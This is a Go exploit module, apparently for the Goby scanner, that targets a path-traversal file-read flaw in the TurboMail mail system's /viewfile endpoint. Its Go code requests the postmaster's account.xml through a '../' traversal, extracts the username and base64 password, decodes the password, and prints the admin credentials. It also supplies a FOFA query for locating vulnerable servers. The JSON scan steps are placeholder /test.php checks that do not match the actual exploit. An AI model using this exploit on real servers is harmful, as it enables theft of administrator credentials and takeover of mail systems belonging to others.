package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TurboMail mail system viewfile file reading vulnerability",
    "Description": "<p>TurboMail mail system is an email server system developed for the communication needs of enterprises and institutions. There is a file reading vulnerability in the TurboMail mail system. An attacker can read the configuration file through this vulnerability, and then perform base64 decryption on the password to log in to the background/maintlogin.jsp.</p>",
    "Product": "TurboMail",
    "Homepage": "http://www.turbomail.org/",
    "DisclosureDate": "2022-09-05",
    "Author": "go0p",
    "FofaQuery": "body=\"maintlogin.jsp\" && body=\"/mailmain?type=logout\"",
    "GobyQuery": "body=\"maintlogin.jsp\" && body=\"/mailmain?type=logout\"",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in the TurboMail mail system. An attacker can read the configuration file through the /viewfile endpoint, and then decrypt the password to base64 and log in to the background /maintlogin.jsp.</p>",
    "Recommendation": "<p>The TurboMail mail system can limit the path, and limit the file name cannot contain / cannot cross directories through the blacklist mechanism.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "TurboMail 邮件系统 viewfile 文件读取漏洞",
            "Product": "TurboMail",
            "Description": "<p>TurboMail邮件系统是面向企事业单位通信需求而研发的电子邮件服务器系统，系统内核采用C语言研发，严谨安全，拥有优秀的发展性。TurboMail邮件系统存在文件读取漏洞，攻击者可以通过该漏洞读取配置文件，进而对password进行base64解密登录后台/maintlogin.jsp。<br></p>",
            "Recommendation": "<p>TurboMail 邮件系统可以对路径进行限制，通过黑名单机制限制文件名不能包含 / 不能跨目录。<br></p>",
            "Impact": "<p>TurboMail邮件系统存在文件读取漏洞，攻击者可以通过 /viewfile 端点该漏洞读取配置文件，进而对 password 进行 base64 解密后，登录后台 /maintlogin.jsp。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "信创"
            ]
        },
        "EN": {
            "Name": "TurboMail mail system viewfile file reading vulnerability",
            "Product": "TurboMail",
            "Description": "<p>TurboMail mail system is an email server system developed for the communication needs of enterprises and institutions. There is a file reading vulnerability in the TurboMail mail system. An attacker can read the configuration file through this vulnerability, and then perform base64 decryption on the password to log in to the background/maintlogin.jsp.<br></p>",
            "Recommendation": "<p>The TurboMail mail system can limit the path, and limit the file name cannot contain / cannot cross directories through the blacklist mechanism.<br></p>",
            "Impact": "<p>There is a file reading vulnerability in the TurboMail mail system. An attacker can read the configuration file through the /viewfile endpoint, and then decrypt the password to base64 and log in to the background /maintlogin.jsp.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-06",
    "Variables": {},
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml")
			cfg.Header.Store("Accept-Language", "en-US;q=0.9,en;q=0.8")
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil &&
				strings.Contains(resp.RawBody, "<username>") &&
				strings.Contains(resp.RawBody, "<password>") &&
				strings.Contains(resp.RawBody, "smtp") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml")
			cfg.Header.Store("Accept-Language", "en-US;q=0.9,en;q=0.8")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil &&
				strings.Contains(resp.RawBody, "<username>") &&
				strings.Contains(resp.RawBody, "<password>") &&
				strings.Contains(resp.RawBody, "smtp") {
				user := regexp.MustCompile(`(?s)<username>(.*?)</username>`).FindStringSubmatch(resp.RawBody)
				passBs64 := regexp.MustCompile(`(?s)<password>(.*?)</password>`).FindStringSubmatch(resp.RawBody)
				if len(user) > 0 && len(passBs64) > 0 {
					expResult.Success = true
					expResult.Output = "username :" + user[1] + "\n"
					pass, _ := base64.StdEncoding.DecodeString(passBs64[1])
					expResult.Output += "password :" + string(pass) + "\n"
				}
			}
			return expResult
		},
	))
}
